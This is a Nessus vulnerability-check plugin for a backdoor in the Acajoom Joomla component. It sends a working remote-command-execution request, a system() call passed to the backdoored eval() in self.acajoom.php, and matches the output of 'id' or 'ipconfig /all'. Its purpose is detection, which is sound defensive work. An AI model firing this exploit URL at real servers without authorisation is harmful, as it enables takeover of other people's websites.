#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(39482);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(35459);
  script_xref(name:"OSVDB", value:"55733");

  script_name(english:"Acajoom Component for Joomla! <= 3.2.6 Backdoor");
  script_summary(english:"Tries to execute a command");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that contains a backdoor\n",
      "allowing execution of arbitrary code."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running Acajoom, a third-party component for\n",
      "Joomla! for managing mailing lists, newsletters, auto-responders, and\n",
      "other sorts of communications.\n",
      "\n",
      "The version of Acajoom installed on the remote host reportedly\n",
      "contains a backdoor in the 'self.acajoom.php' script.  By calling this\n",
      "script and setting the 'lang' parameter to 'en-g', an unauthenticated\n",
      "remote attacker can pass arbitrary input via the 's' parameter to an\n",
      "'eval()' call, to be executed subject to the privileges of the web\n",
      "server user id.\n",
      "\n",
      "Note that there is also reported another backdoor involving the \n",
      "'GetBots()' function in 'install.acajoom.php', which emails\n",
      "information to an address in Russian when the component is installed,\n",
      "although Nessus has not checked for it."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-06/0212.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Unknown at this time."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Unless we're paranoid, make sure we're looking at Acajoom.
  if (report_paranoia < 2)
  {
    url = string(dir, "/index.php?option=com_acajoom");

    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    if (
      'powered by Joobi.' >!< res[2] ||
      'Beginning : Acajoom' >!< res[2]
    ) exit(0);
  }

  # Try to exploit the issue to run a command.
  foreach cmd (cmds)
  {
    exploit = string("system('", cmd, "');");
    url = string(
      dir, "/components/com_acajoom/self.acajoom.php?",
      "s=", urlencode(str:exploit), "&",
      "lang=en-g"
    );

    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(0);

    # There's a problem if we see the expected command output.
    if ('ipconfig' >< exploit) pat = cmd_pats['ipconfig'];
    else pat = cmd_pats['id'];

    if (egrep(pattern:pat, string:res[2]))
    {
      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          output = res[2];

          report = string(
            report,
           "\n",
            "It produced the following output :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            output,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
